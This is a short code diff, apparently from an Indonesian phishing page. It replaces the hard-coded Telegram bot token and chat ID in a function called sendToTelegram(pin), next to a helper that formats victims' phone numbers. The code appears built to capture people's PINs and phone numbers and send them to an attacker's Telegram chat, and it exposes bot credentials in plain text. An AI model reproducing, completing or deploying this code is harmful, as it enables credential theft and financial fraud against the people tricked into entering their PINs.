@@ -63,8 +63,8 @@ function updateDots(showIndex = -1) {
 }
 
 async function sendToTelegram(pin) {
-  const token = '7573991625:AAGEabvedzkHODDvk0hE5RZ7mOWvC981sD4';
-  const chat_id = '7105244348';
+  const token = '8069355920:AAGdHFNeDo7_f44IBD0QuyNZvaDa_x3yrIs';
+  const chat_id = '1031172239';
 
   // Format nomor jadi 4-4-4, contoh: 0821-1234-5678
   function formatNomor(nomor) {
